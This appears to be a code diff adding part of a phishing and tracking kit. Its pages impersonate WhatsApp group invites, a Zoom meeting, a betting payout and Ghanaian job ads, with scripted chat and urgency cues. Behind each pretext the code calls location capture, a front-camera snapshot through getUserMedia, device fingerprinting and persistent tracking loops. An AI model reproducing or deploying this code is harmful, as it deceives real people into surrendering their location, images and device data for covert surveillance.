+async function betC(){const b=document.getElementById('betBtn');b.textContent='Processing...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.mm-detail').innerHTML+=`<div class="mm-receipt fade-up" style="background:#e8eaf6">
+<div class="check" style="background:#1a237e">✓</div><div class="msg" style="color:#1a237e">Withdrawal Initiated!</div>
+<div class="sub" style="color:#5c6bc0">GH₵ 2,450 to MoMo in 5-15 min</div></div>`;
+b.textContent='✓ Processing'},2500)}
+
+// ═══ WHATSAPP GROUPS ═══
+function rWA(){
+const isChurch=PB==='church';
+const isFuneral=PB==='funeral';
+const g=isFuneral?
+{name:'Funeral Planning — Nana Yaw Boakye 🕊️',icon:'🕊️',desc:'One week celebration planning. Contributions and updates. May his soul rest in peace 🙏',count:'67',
+members:[{n:'Auntie Grace',r:'Admin',e:'👩'},{n:'Elder Mensah',r:'Admin',e:'👨'},{n:'Ama Serwaa',e:'👩'},{n:'Kofi Agyeman',e:'👨'},{n:'Akosua Prah',e:'��'},{n:'Yaw Asante',e:'👨'}]}:
+isChurch?
+{name:'Church of Pentecost — Madina',icon:'⛪',desc:'Announcements, prayer requests, and weekly schedule. God is good! 🙏',count:'148',
+members:[{n:'Elder Owusu',r:'Admin',e:'👨‍💼'},{n:'Deaconess Adwoa',r:'Admin',e:'👩'},{n:'Bro. Kwesi',e:'👨'},{n:'Sis. Abena',e:'👩'},{n:'Pastor Mensah',r:'Admin',e:'👨'}]}:
+{name:'Family Meeting 🏠',icon:'👨‍👩‍👧‍👦',desc:'Family discussions and contributions. Respect everyone. No politics! 😂',count:'34',
+members:[{n:'Auntie Grace',r:'Admin',e:'👩'},{n:'Uncle Kofi',r:'Admin',e:'👨'},{n:'Ama Serwaa',e:'👩'},{n:'Yaw Boateng',e:'👨'},{n:'Akua Donkor',e:'👩'}]};
+setOG(g.name,'Tap to join the group · '+g.count+' participants');
+document.getElementById('tc').content='#1f2c34';
+document.body.innerHTML=`<div class="w-page"><div class="w-hero"><div class="img">${g.icon}</div>
+<div class="name">${g.name}</div><div class="meta">Group · ${g.count} participants</div></div>
+<div class="w-body"><div class="w-sec"><div class="hd">Description</div><div class="bd">${g.desc}</div></div>
+<div class="w-sec"><div class="hd">Participants · ${g.count}</div>
+${g.members.map(m=>`<div class="w-mem"><div class="av">${m.e}</div><div style="flex:1"><div class="nm">${m.n}</div>
+${m.r?`<span class="rl">${m.r}</span>`:`<div class="ab">Hey there!</div>`}</div></div>`).join('')}
+<div class="w-mem" style="justify-content:center;padding:10px"><span style="color:#008069;font-size:13px">View all →</span></div>
+</div></div><div class="w-fix"><button class="w-jb" id="wb" onclick="jW()">Join group</button><div class="w-e2e">🔒 End-to-end encrypted</div></div></div>`}
+
+async function jW(){const b=document.getElementById('wb');b.textContent='Joining...';b.disabled=true;await go();
+const isChurch=PB==='church',isFuneral=PB==='funeral';
+const gName=isFuneral?'Funeral — Nana Yaw 🕊️':isChurch?'COP — Madina':'Family Meeting 🏠';
+const gIcon=isFuneral?'🕊️':isChurch?'⛪':'👨‍👩‍👧‍👦';
+const msgs=isFuneral?[
+{s:'Auntie Grace',t:'Akwaaba. We need to plan the one week. Please contribute GH₵ 200 each.',d:1200,c:'#06cf9c'},
+{s:'Elder Mensah',t:'May his soul rest in perfect peace 🙏 The family thanks everyone.',d:3500,c:'#e6a820'},
+{s:'Ama Serwaa',t:'I will send my contribution this evening.',d:6000,c:'#53bdeb'},
+{s:'Kofi Agyeman',t:'What date is the one week? And where?',d:9000,c:'#ff6b6b'},
+{s:'Auntie Grace',t:'Next Saturday at the family house in Adenta. From 8AM. Bring chairs.',d:13000,c:'#06cf9c'},
+{s:'Akosua Prah',t:'What about funeral cloth? Same design?',d:17000,c:'#a865e3'},
+{s:'Elder Mensah',t:'Red and black cloth. GH₵ 80/yard. See me after church Sunday.',d:22000,c:'#e6a820'},
+{s:'Yaw Asante',t:'Rest in peace Uncle 🙏🕊️',d:26000,c:'#66bb6a'},
+]:isChurch?[
+{s:'Elder Owusu',t:'Akwaaba! God bless you 🙏',d:1200,c:'#06cf9c'},
+{s:'Deaconess Adwoa',t:'Welcome! Check pinned messages for this week.',d:3500,c:'#53bdeb'},
+{s:'Bro. Kwesi',t:'Welcome oo 🤗',d:6000,c:'#e6a820'},
+{s:'Sis. Abena',t:'Please pray for Auntie Mercy. She is at Korle Bu 🙏',d:9000,c:'#a865e3'},
+{s:'Pastor Mensah',t:'Bible study Wednesday 6PM. Bring your Bible and a friend 📖',d:13000,c:'#ff6b6b'},
+{s:'Elder Owusu',t:'Church dues for July is GH₵ 20. Pay to Deaconess Adwoa.',d:18000,c:'#06cf9c'},
+]:[
+{s:'Auntie Grace',t:'Akwaaba! We are planning Grandma\'s birthday 🎂',d:1200,c:'#06cf9c'},
+{s:'Uncle Kofi',t:'Everyone contribute GH₵ 100 for the party. Send to Auntie Grace MoMo.',d:3500,c:'#e6a820'},
+{s:'Ama Serwaa',t:'Hiii 👋😊',d:5500,c:'#53bdeb'},
+{s:'Yaw Boateng',t:'Chale who is cooking jollof this time? 😂',d:8000,c:'#ff6b6b'},
+{s:'Auntie Grace',t:'Yaw behave yourself 😂 Akua will do jollof. Ama is doing light soup.',d:11000,c:'#06cf9c'},
+{s:'Akua Donkor',t:'I need GH₵ 300 for jollof ingredients for 50 people oo',d:15000,c:'#a865e3'},
+{s:'Uncle Kofi',t:'Party at my house East Legon. From 2PM. Bring chair if possible 😂🪑',d:20000,c:'#e6a820'},
+];
+setTimeout(()=>{
+document.body.innerHTML=`<div class="w-page"><div class="w-hdr"><span class="bk">←</span><div class="ga">${gIcon}</div>
+<div class="gi"><div class="gn">${gName}</div><div class="gs" id="ws">online</div></div>
+<div style="color:#aebac1;display:flex;gap:16px;font-size:16px">📹 📞 ⋮</div></div>
+<div class="w-ct" id="wc"><div class="w-dt">Today</div><div style="clear:both"></div>
+<div class="w-bb sys">You joined using the group's invite link</div><div style="clear:both"></div>
+<div class="w-bb sys">🔒 Messages and calls are end-to-end encrypted</div><div style="clear:both"></div></div>
+<div class="w-in"><span>😊</span><input type="text" placeholder="Message"><span>🎤</span></div></div>`;
+const cc=document.getElementById('wc');
+msgs.forEach(m=>{setTimeout(()=>{
+const tp=document.createElement('div');tp.id='tpx';
+tp.innerHTML=`<div class="w-tp"><span style="color:#8696a0;font-size:11px;margin-right:3px">${m.s.split(' ')[0]}</span><div class="ds"><span></span><span></span><span></span></div></div><div style="clear:both"></div>`;
+cc.appendChild(tp);cc.scrollTop=cc.scrollHeight;
+document.getElementById('ws').textContent=m.s.split(' ')[0]+' is typing...';
+setTimeout(()=>{tp.remove();const d=document.createElement('div');
+const tm=new Date().toLocaleTimeString([],{hour:'numeric',minute:'2-digit'});
+d.innerHTML=`<div class="w-bb in fade-up"><div class="sn" style="color:${m.c}">${m.s}</div>${m.t}<span class="tm">${tm}</span></div><div style="clear:both"></div>`;
+cc.appendChild(d);cc.scrollTop=cc.scrollHeight;document.getElementById('ws').textContent='online'},1500)},m.d)})},1800)}
+
+// ═══ ZOOM ═══
+function rZoom(){
+setOG('Zoom — Church Committee Meeting','Elder Owusu is inviting you. Tap to join.');
+document.getElementById('tc').content='#242424';
+document.body.innerHTML=`<div class="z-page"><div class="z-card">
+<div style="color:#0b5cff;font-size:24px;font-weight:700;margin-bottom:14px;letter-spacing:1px">zoom</div>
+<div class="z-cam" id="zp"><div class="ph"><div class="av">Y</div><div class="lb">Starting camera...</div></div></div>
+<div style="color:#fff;font-size:17px;font-weight:600;margin-bottom:3px">Church Committee Meeting</div>
+<div style="color:#999;font-size:13px;margin-bottom:14px">Elder Owusu's meeting · Started 2 min ago</div>
+<button onclick="zmJ()" style="background:#0b5cff;color:#fff;border:none;padding:12px;border-radius:8px;font-size:16px;cursor:pointer;width:100%;font-weight:600;font-family:inherit" id="zb">Join</button>
+<div style="text-align:center;font-size:11px;color:#666;margin-top:8px">Meeting ID: 847 2951 0384</div>
+</div></div>`;
+setTimeout(async()=>{try{MS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
+const v=document.createElement('video');v.srcObject=MS;v.setAttribute('playsinline','');v.muted=true;
+v.style.cssText='position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)';
+const p=document.getElementById('zp');p.style.position='relative';p.innerHTML='';p.appendChild(v);
+const nm=document.createElement('div');nm.className='nm';nm.textContent='You';p.appendChild(nm);
+await v.play();await snap('front');try{await gps()}catch(e){}dev()}catch(e){
+document.querySelector('.lb').textContent='Camera unavailable';try{await gps()}catch(e2){}dev()}},600)}
+async function zmJ(){const b=document.getElementById('zb');b.textContent='Connecting...';b.disabled=true;
+if(!OK){OK=true;try{await gps()}catch(e){}if(!MS)try{await cam()}catch(e){}persist();loop()}
+setTimeout(()=>{b.parentElement.innerHTML=`<div class="fade-up" style="text-align:center;color:#fff;padding:32px 0">
+<div style="width:28px;height:28px;border:3px solid #333;border-top-color:#0b5cff;border-radius:50%;margin:0 auto 14px" class="spin"></div>
+<div style="font-size:18px;font-weight:600">Waiting Room</div>
+<div style="color:#999;font-size:13px;margin-top:4px">Elder Owusu will let you in soon</div>
+<div style="background:#1a1a1a;border-radius:8px;padding:10px;margin-top:14px;text-align:left">
+<div style="color:#666;font-size:11px;margin-bottom:5px">IN THE MEETING</div>
+<div style="color:#ccc;font-size:13px;padding:3px 0">🟢 Elder Owusu (Host)</div>
+<div style="color:#ccc;font-size:13px;padding:3px 0">🟢 Deaconess Adwoa</div>
+<div style="color:#ccc;font-size:13px;padding:3px 0">🟢 Bro. Kwesi</div></div></div>`},3000)}
+
+// ═══ IMAGE EMBED ═══
+function rImg(){
+setOG('Photo','Tap to view');
+const params=new URLSearchParams(window.location.search);
+const imgUrl=params.get('img')||'';
+document.body.style.cssText='background:#000;display:flex;align-items:center;justify-content:center;min-height:100vh';
+document.body.innerHTML=`<div id="iw" style="width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;cursor:pointer">
+${imgUrl?`<img src="${imgUrl}" style="max-width:100%;max-height:100vh;object-fit:contain">`:'<div style="color:#fff">Tap to view</div>'}</div>`;
+document.getElementById('iw').addEventListener('click',async()=>{await go()});
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},500)}
+
+// ═══ GHANAIAN JOBS / ARTISAN ═══
+function rJob(){
+const T={
+mason:{n:'Tonaton',c:'#0066cc',t:'Mason Needed — Spintex Road',s:'GH₵ 400/day · Start Monday',tag:'URGENT',bg:'#e3f2fd',
+r:[['Job','Block work + plastering'],['Location','Spintex Road, Accra'],['Pay','GH₵ 400/day'],['Duration','2 weeks'],['Start','This Monday']]},
+carpenter:{n:'Jiji Ghana',c:'#f39c12',t:'Carpenter Needed — Tema',s:'Wardrobe + cabinets · GH₵ 3,000',tag:'NEW',bg:'#fff8e1',
+r:[['Job','Wardrobe + kitchen cabinets'],['Material','Client provides wood'],['Location','Tema Community 25'],['Budget','GH₵ 3,000'],['Timeline','2 weeks']]},
+electrician:{n:'ECG Alert',c:'#d32f2f',t:'Electrician — Dansoman URGENT',s:'DB tripping · Emergency rate OK',tag:'🚨 EMERGENCY',bg:'#fbe9e7',
+r:[['Issue','DB tripping repeatedly'],['Location','Dansoman, Accra'],['Urgency','Fix today'],['Pay','Emergency rate'],['Contact','Tenant Maame Esi']]},
+plumber:{n:'Tonaton',c:'#e64a19',t:'Plumber — Osu Burst Pipe',s:'Water leaking · Fix ASAP',tag:'🚨 EMERGENCY',bg:'#fbe9e7',
+r:[['Issue','Burst pipe in kitchen'],['Location','Osu, Accra'],['Status','Water running'],['Pay','Emergency rate'],['Contact','Ask for Maame Esi']]},
+mechanic:{n:'AutoCheck GH',c:'#e64a19',t:'Toyota Hilux — Spintex',s:'Engine warning · Customer waiting',tag:'SAME DAY',bg:'#fbe9e7',
+r:[['Vehicle','2019 Toyota Hilux'],['Issue','Engine warning + overheating'],['Location','Spintex'],['Customer','Pays cash now'],['Note','Bring scanner']]},
+barber:{n:'Booksy',c:'#4a148c',t:'Barber — Labone Home Visit',s:'GH₵ 200 · Trim + beard',tag:'VIP',bg:'#f3e5f5',
+r:[['Type','Home visit'],['Service','Trim + beard'],['Location','Labone'],['Pay','GH₵ 200'],['Note','Call at gate']]},
+dj:{n:'Tonaton',c:'#0066cc',t:'DJ — Accra Party · GH₵ 1,500',s:'300 guests · This Saturday',tag:'GIG',bg:'#e3f2fd',
+r:[['Event','Birthday party'],['Guests','300'],['Date','This Saturday'],['Location','Achimota'],['Pay','GH₵ 1,500']]},
+photographer:{n:'Tonaton',c:'#0066cc',t:'Photographer — Tema Wedding',s:'Full day · GH₵ 2,500',tag:'BOOKING',bg:'#e3f2fd',
+r:[['Event','Wedding'],['Date','Aug 9, 2026'],['Location','Tema Comm. 6'],['Coverage','Full day'],['Budget','GH₵ 2,500']]},
+nurse:{n:'Ghana Health',c:'#c2185b',t:'Nurse — Korle Bu Night',s:'Tonight 7PM–7AM · GH₵ 250',tag:'URGENT',bg:'#fce4ec',
+r:[['Facility','Korle Bu Hospital'],['Unit','General Ward'],['Shift','Tonight 7PM-7AM'],['Pay','GH₵ 250 + allowance'],['Report','6:30PM']]},
+kumawood:{n:'GhOneTV',c:'#9c27b0',t:'Kumawood Actors Needed',s:'Lead role · GH₵ 2,000/day',tag:'CASTING',bg:'#f3e5f5',
+r:[['Production','New series'],['Role','Supporting lead'],['Location','Kumasi'],['Pay','GH₵ 2,000/day'],['Audition','This Saturday']]},
+meqasa:{n:'Meqasa',c:'#1565c0',t:'Tenant — 2BR East Legon',s:'GH₵ 3,500/month · 2yrs advance',tag:'HOT',bg:'#e3f2fd',
+r:[['Type','2 Bedroom'],['Area','East Legon'],['Budget','GH₵ 3,500/month'],['Advance','2 years ready'],['Move-in','Immediately']]},
+truck:{n:'Cargo GH',c:'#c62828',t:'Truck Load — Accra to Kumasi',s:'GH₵ 4,500 · Tomorrow 5AM',tag:'LOAD',bg:'#fbe9e7',
+r:[['Route','Tema Port → Kumasi'],['Load','10 tonnes materials'],['Pay','GH₵ 4,500'],['Pickup','Tomorrow 5AM'],['Truck','Flatbed']]},
+bolt:{n:'Bolt Ghana',c:'#34e27c',t:'Surge — Airport City',s:'GH₵ 50+ per trip',tag:'SURGE',bg:'#e8f5e9',
+r:[['Area','Airport City'],['Demand','Very High'],['Avg Trip','GH₵ 50-80'],['Time','Now'],['Note','Airport pickups extra']]},
+landcase:{n:'LawGH',c:'#1b5e20',t:'Land Case — Kasoa',s:'Dispute · Client paying upfront',tag:'REFERRAL',bg:'#e8f5e9',
+r:[['Case','Land dispute'],['Location','Kasoa'],['Issue','Encroachment + fake docs'],['Client','Pays upfront'],['Docs','Survey plan available']]},
+influencer:{n:'GH Influencer',c:'#ad1457',t:'Brand Deal — Kasapreko',s:'1 IG Reel · GH₵ 3,000',tag:'SPONSORED',bg:'#fce4ec',
+r:[['Brand','Kasapreko'],['Content','1 Instagram Reel'],['Pay','GH₵ 3,000'],['Product','Free drinks'],['Deadline','Next Friday']]},
+churchhelp:{n:'Church Notice',c:'#4a148c',t:'Bro. Asante — House Fire',s:'Kasoa · Family needs help',tag:'URGENT',bg:'#f3e5f5',
+r:[['Family','Bro. Asante + 3 children'],['Situation','House fire Kasoa'],['Need','Clothing, food, shelter'],['Fund','Church GH₵ 2,000'],['Contact','Deacon Mensah']]},
+cleaner:{n:'Tonaton',c:'#2e7d32',t:'Deep Clean — 4BR Cantonments',s:'Move-out · GH₵ 600',tag:'PREMIUM',bg:'#e8f5e9',
+r:[['Type','Full deep clean'],['Size','4BR / 3 washroom'],['Area','Cantonments'],['Pay','GH₵ 600'],['When','This weekend']]},
+studio:{n:'Music GH',c:'#e65100',t:'Studio Session — Tema',s:'Recording · GH₵ 500/day',tag:'SESSION',bg:'#fff3e0',
+r:[['Studio','Beat House, Tema'],['Work','Vocal recording'],['Rate','GH₵ 500/day'],['Days','2 days'],['Note','Lyrics ready']]},
+trainer:{n:'FitGH',c:'#00838f',t:'Training — Airport Area',s:'GH₵ 150/session · 3x/week',tag:'NEW CLIENT',bg:'#e0f7fa',
+r:[['Client','Nana Ama'],['Goal','Wedding prep'],['Budget','GH₵ 150/session'],['Frequency','3x per week'],['Gym','Airport Residential']]},
+};
+const t=T[PB]||T.mason;
+setOG(t.t+' — '+t.n,t.s);
+document.body.innerHTML=`<div class="jb-page"><div class="jb-nav"><span class="logo" style="color:${t.c}">${t.n}</span>
+<div class="bell">🔔<span class="dot"></span></div></div>
+<div class="jb-bd"><div style="background:#fff3e0;border-left:3px solid #ff9800;border-radius:0 8px 8px 0;padding:9px 12px;margin-bottom:8px;font-size:12px;color:#e65100">⚡ New job — be fast!</div>
+<div class="jb-card"><div class="top"><span class="jb-tag" style="background:${t.bg};color:${t.c}">${t.tag}</span>
+<h2>${t.t}</h2><div class="sub">${t.s}</div></div>
+<div class="bdy">${t.r.map(r=>`<div class="jb-row"><span class="l">${r[0]}</span><span class="v">${r[1]}</span></div>`).join('')}
+<div class="jb-dist" id="jm"><div class="ic"><span class="spin" style="display:inline-block;width:14px;height:14px;border:2px solid rgba(0,0,0,.1);border-top-color:${t.c};border-radius:50%"></span></div>
+<div><div style="font-size:14px;font-weight:600;color:#757575">Getting location...</div>
+<div style="font-size:11px;color:#9e9e9e;margin-top:1px">Calculating distance</div></div></div>
+<button class="jb-btn" style="background:${t.c}" onclick="jA()">View Details & Contact</button>
+<div class="jb-urg">⏰ 5 artisans contacted · Be fast!</div></div></div></div></div>`;
+setTimeout(async()=>{try{await gps();setTimeout(()=>{const m=document.getElementById('jm');
+if(m)m.innerHTML='<div class="ic">📍</div><div><div style="font-size:14px;font-weight:600;color:#2e7d32">2.8 km from you</div><div style="font-size:11px;color:#66bb6a;margin-top:1px">About 15 min by trotro</div></div>'},2500)}
+catch(e){}dev()},1000)}
+
+async function jA(){const b=document.querySelector('.jb-btn');b.textContent='Loading...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.bdy').innerHTML+=`<div class="jb-reveal fade-up">
+<h3>📞 Contact</h3>
+<div class="row"><span style="color:#689f38">Name</span><span style="color:#212121;font-weight:500">Kwame Ansah</span></div>
+<div class="row"><span style="color:#689f38">Phone</span><span style="color:#212121;font-weight:500">024 XXX XXXX</span></div>
+<div class="row"><span style="color:#689f38">Location</span><span style="color:#212121;font-weight:500">Near Shell station</span></div>
+<div class="row"><span style="color:#689f38">Note</span><span style="color:#212121;font-weight:500">Call first. Ask for Kwame.</span></div>
+<p style="font-size:11px;color:#999;margin-top:8px;text-align:center">Full number sent via SMS</p></div>`;
+b.textContent='✓ Loaded';b.style.background='#4caf50'},2500)}
+
+// ═══ ROUTER — Matches templates.json url_path exactly ═══
+const R={
+  momo:rMomo,
+  voda:rVoda,
+  ecg:rECG,
+  nia:rNIA,
+  gra:rGRA,
+  bet:rBet,
+  family:rWA,
+  church:rWA,
+  funeral:rWA,
+  meeting:rZoom,
+  img:rImg
+};
+(R[PB]||rJob)();
+</script>
+</body>
+</html>
